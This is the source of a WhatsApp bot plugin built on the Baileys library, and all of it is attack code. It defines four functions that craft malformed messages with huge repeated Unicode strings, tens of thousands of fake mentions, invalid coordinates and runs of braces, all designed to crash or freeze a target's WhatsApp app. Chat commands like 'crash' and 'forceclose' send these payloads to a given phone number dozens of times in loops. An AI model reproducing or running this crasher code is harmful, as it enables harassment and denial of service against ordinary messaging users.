const { generateWAMessageFromContent } = require('baileys');

// Sleep helper
const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

// ============ ATTACK FUNCTIONS ============

async function VampireBlankIphone(target, sock) {
    try {
        const messsage = {
            botInvokeMessage: {
                message: {
                    newsletterAdminInviteMessage: {
                        newsletterJid: `33333333333333333@newsletter`,
                        newsletterName: "𝐆𝐫𝐢𝐦𝐑𝐞𝐚𝐩𝐞𝐫" + "ી".repeat(120000),
                        jpegThumbnail: "",
                        caption: "ꦽ".repeat(120000),
                        inviteExpiration: Date.now() + 1814400000,
                    },
                },
            },
        };
        await sock.relayMessage(target, messsage, { userJid: target });
    } catch (err) {
        console.log(err);
    }
}

async function FChyUi(target, sock) {
    let hyuiForceX = JSON.stringify({
        status: true,
        criador: "hyuiForcex",
        resultado: {
            type: "md",
            ws: {
                _events: { "CB:ib,,dirty": ["Array"] },
                _eventsCount: 800000,
                _maxListeners: 0,
                url: "wss://web.whatsapp.com/ws/chat",
                config: {
                    version: ["Array"],
                    browser: ["Array"],
                    waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
                    sockCectTimeoutMs: 20000,
                    keepAliveIntervalMs: 30000,
                    logger: {},
                    printQRInTerminal: false,
                    emitOwnEvents: true,
                    defaultQueryTimeoutMs: 60000,
                    customUploadHosts: [],
                    retryRequestDelayMs: 250,
                    maxMsgRetryCount: 5,
                    fireInitQueries: true,
                    auth: { Object: "authData" },
                    markOnlineOnsockCect: true,
                    syncFullHistory: true,
                    linkPreviewImageThumbnailWidth: 192,
                    transactionOpts: { Object: "transactionOptsData" },
                    generateHighQualityLinkPreview: false,
                    options: {},
                    appStateMacVerification: { Object: "appStateMacData" },
                    mobile: true
                }
            }
        }
    });

    const contextInfo = {
        mentionedJid: [target],


        businessMessageForwardInfo: { businessOwnerJid: target }
    };

    let messagePayload = {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2
                },
                interactiveMessage: {
                    contextInfo,
                    body: { text: "𝙳𝚄𝙰𝚁 [ 𝟸 ] 🔥" },
                    nativeFlowMessage: {
                        buttons: [
                            { name: "single_select", buttonParamsJson: hyuiForceX + "𝐇𝐲𝐔𝐢 𝐅𝐨𝐫𝐜𝐞𝐙𝐱" },
                            { name: "call_permission_request", buttonParamsJson: hyuiForceX + "\u0003" },
                        ]
                    }
                }
            }
        }
    };

    await sock.relayMessage(target, messagePayload, { participant: { jid: target } });
}

async function Blankhard(target, sock) {
    let message = {
        viewOnceMessage: {
            message: {
                stickerMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
                    fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
                    fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
                    mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
                    mimetype: "image/webp",
                    directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
                    fileLength: { low: 1, high: 0, unsigned: true },
                    mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
                    firstFrameLength: 19904,
                    firstFrameSidecar: "KN4kQ5pyABRAgA==",
                    isAnimated: true,
                    contextInfo: {
                        mentionedJid: [
                            "0@s.whatsapp.net",
                            ...Array.from({ length: 40000 }, () =>
                                "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                            ),
                        ],
                        groupMentions: [],
                        entryPointConversionSource: "non_contact",
                        entryPointConversionApp: "whatsapp",
                        entryPointConversionDelaySeconds: 467593,
                    },
                    stickerSentTs: { low: -1939477883, high: 406, unsigned: false },
                    isAvatar: false,
                    isAiSticker: false,
                    isLottie: false,
                },
            },
        },
    };

    const msg = generateWAMessageFromContent(target, message, {});
    await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            { tag: "to", attrs: { jid: target }, content: undefined },
                        ],
                    },
                ],
            },
        ],
    });
}

async function InvisibleFC(target, sock) {
    try {
        let message = {
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        header: {
                            title: "Hades Is Back!",
                            hasMediaAttachment: false,
                            locationMessage: {
                                degreesLatitude: -999.035,
                                degreesLongitude: 922.999999999999,
                                name: "Hades Is Back!",
                                address: "Hades Is Back!",
                            },
                        },
                        body: { text: "Hades Is Back!" },
                        nativeFlowMessage: {
                            messageParamsJson: "{".repeat(10000),
                        },
                        contextInfo: {
                            participant: target,
                            mentionedJid: ["0@s.whatsapp.net"],
                        },
                    },
                },
            },
        };

        await sock.relayMessage(target, message, {
            messageId: null,
            participant: { jid: target },
            userJid: target,
        });
    } catch (err) {
        console.log(err);
    }
}

// ============ EXPORT COMMANDS ============

module.exports = {
    name: 'attack',  // optional, just for reference
    handle: async (sock, m, { isOwner, isPremium, reply, mess, prefix, command, q }) => {
        // COMMAND: fc-invis / fclose / forceclose
        if (['fc-invis', 'fclose', 'forceclose'].includes(command)) {
            if (!isOwner && !isPremium) return reply(mess.prem);
            if (!q) return reply(`*Format Salah!*\nContoh: ${prefix + command} 62xxx`);

            let pelaku = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '');
            let isTarget = pelaku + "@s.whatsapp.net";
            await sock.sendMessage(m.chat, { react: { text: '🩸', key: m.key } });

            for (let r = 0; r < 80; r++) {
                await InvisibleFC(isTarget, sock);
                // Second parameter for Ptcp not needed (original code had a syntax error)
                await sleep(5000);
                await InvisibleFC(isTarget, sock);
            }

            let put = `*Information Attack*\n* Target : ${pelaku}\n* Status : Success\n`;
            await sock.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
            reply(put);
            return;
        }

        // COMMAND: delayinvis / delaymaker
        if (['delayinvis', 'delaymaker'].includes(command)) {
            if (!isOwner && !isPremium) return reply(mess.prem);
            if (!q) return reply(`*Format Salah!*\nContoh: ${prefix + command} 62xxx`);

            let pelaku = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '');
            let isTarget = pelaku + "@s.whatsapp.net";
            await sock.sendMessage(m.chat, { react: { text: '🩸', key: m.key } });

            for (let r = 0; r < 80; r++) {
                await Blankhard(isTarget, sock);
                await sleep(5000);
                await Blankhard(isTarget, sock);
            }

            let put = `*Information Attack*\n* Target : ${pelaku}\n* Status : Success\n`;
            await sock.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
            reply(put);
            return;
        }

        // COMMAND: crash / delayip
        if (['crash', 'delayip'].includes(command)) {
            if (!isOwner && !isPremium) return reply(mess.prem);
            if (!q) return reply(`*Format Salah!*\nContoh: ${prefix + command} 62xxx`);

            let pelaku = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '');
            let isTarget = pelaku + "@s.whatsapp.net";
            await sock.sendMessage(m.chat, { react: { text: '🩸', key: m.key } });

            for (let r = 0; r < 50; r++) {
                await VampireBlankIphone(isTarget, sock);
                await sleep(5000);
                await FChyUi(isTarget, sock);
            }

            let put = `*Information Attack*\n* Target : ${pelaku}\n* Status : Success\n`;
            await sock.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
            reply(put);
            return;
        }
    }
};